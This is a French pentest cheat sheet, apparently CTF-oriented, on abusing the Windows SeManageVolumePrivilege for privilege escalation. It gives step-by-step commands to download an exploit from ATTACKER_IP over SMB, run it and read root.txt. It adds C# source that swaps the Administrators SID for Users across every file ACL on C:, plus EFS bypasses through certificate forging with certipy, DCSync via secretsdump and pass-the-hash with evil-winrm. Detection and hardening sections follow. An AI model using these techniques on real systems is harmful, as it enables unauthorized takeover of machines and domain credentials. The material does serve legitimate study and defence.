# SeManageVolumePrivilege

#### <mark style="color:green;">📋 Description</mark>

`SeManageVolumePrivilege` est un privilège Windows qui permet d'effectuer des **opérations de maintenance au niveau volume**. L'abus de ce privilège permet de **modifier les ACLs** de n'importe quel fichier du système en remplaçant le SID du groupe Administrators par celui du groupe Users.

#### <mark style="color:green;">🎯 Prérequis</mark>

* Compte avec le privilège `SeManageVolumePrivilege` activé
* Accès à un exploit (SeManageVolumeExploit.exe)
* Système Windows avec NTFS

#### <mark style="color:green;">🔍 Vérification du privilège</mark>

```powershell
# Lister les privilèges
whoami /priv

# Rechercher spécifiquement SeManageVolumePrivilege
whoami /priv | findstr SeManageVolumePrivilege

# Output attendu :
# SeManageVolumePrivilege    Perform volume maintenance tasks    Enabled
```

#### <mark style="color:green;">🧠 Principe technique</mark>

**Comportement normal**

```
Fichier : C:\Users\Administrator\Desktop\root.txt
ACL : Administrators (S-1-5-32-544) = Full Control
      Users (S-1-5-32-545) = No Access
                ↓
User normal ne peut pas lire root.txt
```

**Après exploitation**

```
Exploit remplace dans TOUTES les ACLs du volume :
S-1-5-32-544 (Administrators) → S-1-5-32-545 (Users)
                ↓
User normal a maintenant les droits des Administrators !
```

#### <mark style="color:green;">⚔️ Exploitation</mark>

**Étape 1 : Télécharger l'exploit**

```powershell
# Sur la machine cible
cd C:\ProgramData

# Avec Evil-WinRM
upload SeManageVolumeExploit.exe SeManageVolumeExploit.exe

# Avec SMB
copy \\ATTACKER_IP\share\SeManageVolumeExploit.exe .
```

**Étape 2 : Exécuter l'exploit**

```powershell
.\SeManageVolumeExploit.exe

# Output :
# Entries changed: 842
# DONE
```

**Ce qui se passe :**

1. L'exploit scanne tous les fichiers du volume C:\\
2. Pour chaque ACL contenant le SID `S-1-5-32-544` (Administrators)
3. Il remplace par `S-1-5-32-545` (Users)
4. Résultat : **tous les fichiers précédemment accessibles uniquement par Administrators sont maintenant accessibles par Users**

**Étape 3 : Accéder aux fichiers protégés**

```powershell
# Maintenant accessible (mais toujours chiffré avec EFS !)
cd C:\Users\Administrator\Desktop
dir

# Mode                LastWriteTime         Length Name
# ----                -------------         ------ ----
# -ar---       11/23/2024   6:55 PM             70 root.txt

# ⚠️ IMPORTANT : Le fichier peut être chiffré avec EFS
type root.txt
# Access to the path [...] is denied.  → EFS protection

# Vérifier le chiffrement
cipher /c root.txt
```

#### <mark style="color:green;">🔐 Bypass EFS (si nécessaire)</mark>

Si le fichier est chiffré avec EFS, l'abus de SeManageVolumePrivilege ne suffit pas. Il faut obtenir les credentials du compte Administrator.

**Méthodes de bypass :**

**Option 1 : Golden Certificate (voir section dédiée)**

```powershell
# Exporter le certificat de la CA
certutil -exportPFX SERIAL_NUMBER ca.pfx

# Forger un certificat pour Administrator
certipy forge -ca-pfx ca.pfx -upn Administrator@DOMAIN -subject 'CN=ADMINISTRATOR,...'

# S'authentifier avec le certificat forgé
certipy auth -pfx administrator_forged.pfx -dc-ip DC_IP

# Obtenir le hash NTLM et se connecter
evil-winrm -i DC -u Administrator -H HASH
```

**Option 2 : DCSync**

```powershell
# Si le compte a les droits DCSync
secretsdump.py DOMAIN/USER:PASSWORD@DC_IP

# Récupérer le hash Administrator et se connecter
evil-winrm -i DC -u Administrator -H HASH
```

#### <mark style="color:green;">🛠️ Fonctionnement détaillé de l'exploit</mark>

**Code source conceptuel (C#)**

```csharp
// SeManageVolumeExploit simplifié
using System;
using System.IO;
using System.Security.AccessControl;
using System.Security.Principal;

class Program {
    static void Main() {
        // SIDs à remplacer
        SecurityIdentifier adminsSID = new SecurityIdentifier("S-1-5-32-544"); // Administrators
        SecurityIdentifier usersSID = new SecurityIdentifier("S-1-5-32-545");  // Users
        
        int count = 0;
        
        // Parcourir tous les fichiers
        foreach (string file in Directory.EnumerateFiles(@"C:\", "*", SearchOption.AllDirectories)) {
            try {
                FileSecurity fs = File.GetAccessControl(file);
                AuthorizationRuleCollection rules = fs.GetAccessRules(true, true, typeof(SecurityIdentifier));
                
                bool modified = false;
                foreach (FileSystemAccessRule rule in rules) {
                    if (rule.IdentityReference == adminsSID) {
                        // Supprimer la règle Administrators
                        fs.RemoveAccessRule(rule);
                        
                        // Ajouter la même règle pour Users
                        FileSystemAccessRule newRule = new FileSystemAccessRule(
                            usersSID,
                            rule.FileSystemRights,
                            rule.AccessControlType
                        );
                        fs.AddAccessRule(newRule);
                        
                        modified = true;
                    }
                }
                
                if (modified) {
                    File.SetAccessControl(file, fs);
                    count++;
                }
            } catch {
                // Ignorer les erreurs (fichiers système, etc.)
            }
        }
        
        Console.WriteLine($"Entries changed: {count}");
        Console.WriteLine("DONE");
    }
}
```

#### <mark style="color:green;">📊 SIDs Windows importants</mark>

| SID          | Nom                  | Description                  |
| ------------ | -------------------- | ---------------------------- |
| S-1-5-32-544 | Administrators       | Groupe admin local           |
| S-1-5-32-545 | Users                | Groupe utilisateurs standard |
| S-1-5-32-546 | Guests               | Groupe invités               |
| S-1-5-32-551 | Backup Operators     | Opérateurs de sauvegarde     |
| S-1-5-32-555 | Remote Desktop Users | Utilisateurs RDP             |
| S-1-5-18     | SYSTEM               | Compte système local         |
| S-1-5-19     | LOCAL SERVICE        | Service local                |
| S-1-5-20     | NETWORK SERVICE      | Service réseau               |

#### <mark style="color:green;">⚠️ Limitations et contournements</mark>

**Limitation 1 : EFS (Encrypting File System)**

```powershell
# Si le fichier est chiffré avec EFS
cipher /c file.txt
# Output: E file.txt (E = Encrypted)

# L'exploit donne les droits NTFS mais pas la clé de déchiffrement EFS
# Solution : Obtenir le compte qui a chiffré le fichier
```

**Limitation 2 : Fichiers système protégés**

```powershell
# Certains fichiers système restent inaccessibles :
# - C:\Windows\System32\config\SAM
# - C:\Windows\System32\config\SYSTEM
# - Fichiers en cours d'utilisation

# Ces fichiers nécessitent d'autres techniques (Shadow Copy, etc.)
```

**Limitation 3 : Restauration des ACLs**

```powershell
# L'exploit est DESTRUCTIF et irréversible sans backup
# Les ACLs modifiées ne peuvent être restaurées automatiquement

# Recommandation : Créer un snapshot avant
wmic shadowcopy call create Volume=C:\
```

#### <mark style="color:green;">🔍 Vérification post-exploitation</mark>

```powershell
# Vérifier les ACLs d'un fichier
icacls "C:\Users\Administrator\Desktop\root.txt"

# AVANT l'exploit :
# C:\Users\Administrator\Desktop\root.txt BUILTIN\Administrators:(F)
#                                          NT AUTHORITY\SYSTEM:(F)

# APRÈS l'exploit :
# C:\Users\Administrator\Desktop\root.txt BUILTIN\Users:(F)
#                                          NT AUTHORITY\SYSTEM:(F)

# Lister les fichiers modifiés récemment
Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue | 
    Where-Object { $_.LastWriteTime -gt (Get-Date).AddMinutes(-5) }
```

#### <mark style="color:green;">🛡️ Détection</mark>

**Événements Windows à surveiller**

```
Event ID 4670 : Permissions on an object were changed
Event ID 4663 : An attempt was made to access an object
Event ID 4656 : A handle to an object was requested

# Rechercher dans les logs
Get-WinEvent -FilterHashtable @{
    LogName='Security'
    ID=4670
} | Where-Object {
    $_.Message -like "*SeManageVolumePrivilege*"
}
```

**Indicateurs de compromission (IOC)**

* Modification massive d'ACLs en peu de temps
* Utilisation de SeManageVolumePrivilege par un compte non-administrateur
* Accès à des fichiers sensibles par des comptes inhabituels
* Présence de SeManageVolumeExploit.exe ou similaire

#### <mark style="color:green;">🛡️ Prévention</mark>

**Audit des privilèges**

```powershell
# Lister les comptes avec SeManageVolumePrivilege
$accounts = @()
Get-WmiObject -Class Win32_UserAccount | ForEach-Object {
    $user = $_.Name
    $privs = (whoami /priv /USER:$user 2>$null)
    if ($privs -match "SeManageVolumePrivilege") {
        $accounts += $user
    }
}
$accounts

# Réviser les assignations de privilèges
secedit /export /cfg security_config.inf
# Éditer security_config.inf pour retirer SeManageVolumePrivilege
secedit /configure /db secedit.sdb /cfg security_config.inf
```

**Durcissement**

```powershell
# Politique de groupe : Restreindre les privilèges
# Computer Configuration > Windows Settings > Security Settings > 
# Local Policies > User Rights Assignment > Perform volume maintenance tasks
# → Laisser VIDE ou uniquement Administrators

# Activer l'audit des changements ACL
auditpol /set /subcategory:"File System" /success:enable /failure:enable

# Monitorer les accès sensibles
auditpol /set /subcategory:"Sensitive Privilege Use" /success:enable
```

#### <mark style="color:green;">📚 Références</mark>

* [Microsoft Docs - SeManageVolumePrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks)
* [Grzegorz Tworek - SeManageVolumeAbuse Video](https://www.youtube.com/watch?v=JNJXC-7JsYE)
* [CsEnox - SeManageVolumeExploit](https://github.com/CsEnox/SeManageVolumeExploit)
